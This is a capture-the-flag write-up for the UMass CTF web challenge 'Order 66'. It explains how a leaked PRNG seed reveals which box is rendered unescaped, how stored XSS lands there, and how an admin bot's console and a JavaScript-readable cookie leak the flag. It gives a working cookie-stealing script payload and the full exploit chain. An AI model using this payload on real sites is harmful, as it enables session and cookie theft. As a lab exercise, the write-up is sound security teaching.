# Order 66 - UMass CTF Web Writeup (My POV)

## Challenge

The challenge description was:

> See if you can figure out what order to execute...

Target:

```text
http://order66.web.ctf.umasscybersec.org:32768/
```

Flag format:

```text
UMASS{...}
```

The challenge folder included both the Flask app and the bot source, which meant I could work from the real server-side logic instead of guessing from the frontend alone.

Files that mattered:

- `app.py`
- `app.js`
- `templates/index.html`
- `templates/admin.html`

That already suggested the classic pattern:

1. main app
2. admin/bot endpoint
3. some kind of stored content
4. browser automation that probably visits attacker-controlled pages

So before touching the live target too much, I read the source carefully.

## Step 1: Understand the Main Application

The core helper in `app.py` was:

```python
def get_grid_context(uid, seed):
    random.seed(seed) 
    v_index = random.randint(1, 66)
    data = {i: (db.get(f"{uid}:box_{i}") or "") for i in range(1, 67)}
    return data, v_index
```

This does two important things:

- it chooses one special box index from `1..66`
- it does that deterministically from `seed`

So the page has exactly one "special" order box for a given seed.

That matters because the template decides whether a box is rendered safely or unsafely based on that index.

## Step 2: Find the XSS Sink

In `templates/index.html`, each box is rendered like this:

```jinja2
{% if i == vuln_index %}
    {{ content | safe }}
{% else %}
    {{ content }}
{% endif %}
```

This is the main vulnerability.

Basic idea:

- `{{ content }}` means Jinja escapes HTML
- `{{ content | safe }}` means Jinja trusts it and injects it as raw HTML

So for exactly one box per seed, I get stored XSS.

That means the problem becomes:

1. learn the current seed
2. compute the special box index for that seed
3. store a JavaScript payload in that exact box
4. make the admin bot visit the page

## Step 3: Confirm That the Page Leaks the Seed

The template also included this:

```html
<script id="session-logic">
    const bot_uid = "{{ user_id }}";
    const bot_seed = "{{ seed }}"; 
</script>
```

That completely removes the guesswork.

The page directly tells me:

- my current `uid`
- my current `seed`

So I do not need to brute-force anything.

I can just extract the seed from the HTML, reproduce Python's PRNG locally, and compute the vulnerable order number exactly.

## Step 4: Reproduce the Vulnerable Order

The Flask code uses:

```python
random.seed(seed)
random.randint(1, 66)
```

So I can do the same thing locally:

```python
import random

random.seed(seed)
idx = random.randint(1, 66)
```

That `idx` is the only box that will be rendered with `|safe`.

For example, during my real solve I got:

- `uid = 4c685616-9065-4cd9-9c58-ba5a6f855ff2`
- `seed = 9340`
- vulnerable index = `14`

So for that session, `ORDER_14` was the XSS sink.

## Step 5: Understand the Form Restrictions

Back in `app.py`, the POST handler had this logic:

```python
submitted = [int(k.split('_')[1]) for k in request.form if k.startswith('box_') and request.form[k].strip()]

if len(submitted) > 1:
    return "ERROR: Only ONE box allowed.", 400
```

So I was only allowed to submit one non-empty box at a time.

Then this loop mattered:

```python
for i in range(1, 67):
    content = request.form.get(f'box_{i}')
    if content and i in submitted:
        db.set(f"{uid}:box_{i}", content)
    else:
        db.delete(f"{uid}:box_{i}")
```

This means:

- my content is stored in Redis under my `uid`
- only the one submitted box survives
- all other boxes for my `uid` are deleted

So I needed to place my payload in exactly one correct box.

## Step 6: Why the Seed Stability Logic Matters

The app also had:

```python
current_content = db.get(f"{uid}:box_{current_vuln_index}") or ""
is_payload_present = "<script" in current_content.lower() or "alert(" in current_content.lower()

...

if not is_payload_present:
    session['seed'] = random.randint(1000, 9999)
else:
    session['seed'] = current_seed
```

At first glance this looks annoying because the seed changes between requests.

But the developer accidentally gave me two ways around that:

### Way 1: Just use a `<script>` payload

If the payload in the current vulnerable box contains `<script` or `alert(`, then the seed stays the same.

That means if I compute the right vulnerable box and store:

```html
<script>...</script>
```

the same seed remains valid.

### Way 2: The `/view/<uid>/<seed>` route accepts any seed

Even more importantly, the viewing route is:

```python
@app.route("/view/<uid>/<int:seed>")
def view_grid(uid, seed):
    grid_data, vuln_index = get_grid_context(uid, seed)
    return render_template(...)
```

So the seed is not protected server-side by the session.

That means the URL itself controls which box is treated as vulnerable for a given `uid`.

This is a big design mistake:

- stored content is keyed only by `uid` and `box_n`
- the "which box is unsafe" decision is keyed by attacker-controlled `seed` in the URL

So if I know a seed that maps to a box I control, I can render that box as raw HTML just by visiting `/view/<uid>/<seed>`.

The page itself leaks one valid seed, so the exploit is trivial.

## Step 7: Understand the Admin Bot

The next part was the bot in `app.js`:

```javascript
page.on('console', msg => console.log(msg.text()));
```

That is the exfil channel.

Anything JavaScript logs with `console.log(...)` inside the bot browser gets printed to Node stdout.

Then it sets the flag cookie:

```javascript
await page.setCookie({
    name: 'flag',
    value: FLAG,
    domain: parsedUrl.hostname,
    path: '/',
    httpOnly: false,
    secure: false,
    sameSite: 'Lax'
});
```

Two important points here:

1. The flag is stored as a browser cookie
2. `httpOnly: false` means JavaScript can read it using `document.cookie`

So the intended XSS payload is obvious:

```html
<script>console.log(document.cookie)</script>
```

That reads the cookie and prints it into the bot's console.

Because the admin endpoint returns the bot's stdout back to me, I get the flag in the response.

## Step 8: Understand Why the Hostname Does Not Matter

One detail on the page was weird:

```html
value="http://None/view/<uid>/<seed>"
```

That looked broken, and it came from:

```python
host = os.getenv('Host')
```

and then:

```jinja2
value="http://{{ host }}/view/{{ user_id }}/{{ seed }}"
```

So the generated share URL was not trustworthy.

But this turned out not to matter at all because `/admin/visit` rewrites the hostname anyway:

```python
parsed_url = urlparse(target_url)
internal_target = target_url.replace(parsed_url.netloc, f"web:{PORT}")
```

This means I can submit:

```text
http://x/view/<uid>/<seed>
```

or

```text
http://anything/view/<uid>/<seed>
```

and the server will internally rewrite it to:

```text
http://web:80/view/<uid>/<seed>
```

So the hostname I supply is effectively ignored. Only the path matters.

That is why I did not need the broken `http://None/...` value at all.

## Step 9: Build the Full Exploit Chain

At this point the full attack path was:

1. Request `/`
2. Extract `uid` and `seed` from the inline script
3. Recompute the vulnerable order number with Python's `random`
4. Submit one field:

```html
<script>console.log(document.cookie)</script>
```

5. Send the bot to:

```text
http://x/view/<uid>/<seed>
```

6. The bot loads the page
7. The payload runs in the one `|safe` box
8. JavaScript reads `document.cookie`
9. The bot logs it to stdout
10. `/admin/visit` returns stdout to me

That is the whole exploit.

## Step 10: The Actual Payload

I used the simplest possible payload:

```html
<script>console.log(document.cookie)</script>
```

I did not need:

- external callbacks
- fetch exfiltration
- image beacons
- DOM tricks

The bot was already configured to give me console output directly.

So `console.log(document.cookie)` was enough.

## My Solve Script

I wrote a script that:

1. starts a session
2. extracts `uid` and `seed`
3. computes the vulnerable box
4. stores the XSS payload in that box
5. sends the admin bot to the matching `/view/<uid>/<seed>` URL
6. prints the bot output and extracts the flag

The exact script is saved as `solve.py` in this directory.

The logic is:

```python
random.seed(seed)
idx = random.randint(1, 66)
payload = "<script>console.log(document.cookie)</script>"
target_url = f"http://x/view/{uid}/{seed}"
```

That is enough to solve the challenge end-to-end.

## Real Solve Output

During the live solve, the bot returned:

```text
flag=UMASS{m@7_t53_f0rce_b$_w!th_y8u}
```

So the flag was:

```text
UMASS{m@7_t53_f0rce_b$_w!th_y8u}
```

## Why This Challenge Works

I liked this challenge because it layers a few very simple web bugs into a clean exploit chain:

### Bug 1: Deterministic, user-derivable vulnerable index

The vulnerable box is based only on a seed that the page leaks back to me.

### Bug 2: Stored XSS in exactly one box

One box per seed is rendered with `|safe`.

### Bug 3: Attacker-controlled seed in the `/view` route

The route decides which box is dangerous using a seed directly from the URL path.

### Bug 4: Admin bot exposes its own console

The bot logs page `console.log(...)` output and the server returns it to the attacker.

### Bug 5: Flag cookie is readable by JavaScript

`httpOnly: false` turns XSS into direct flag theft.

Each individual bug is small, but together they make the solve very straightforward.

## Basic Takeaway

If I explain this challenge in the simplest terms:

- one box is vulnerable to XSS
- the page leaks which one
- the admin bot visits attacker-controlled pages
- the bot stores the flag in a readable cookie
- and the bot gives me console output

So I put:

```html
<script>console.log(document.cookie)</script>
```

into the right order box and sent the bot to that page.

## Final Flag

```text
UMASS{m@7_t53_f0rce_b$_w!th_y8u}
```
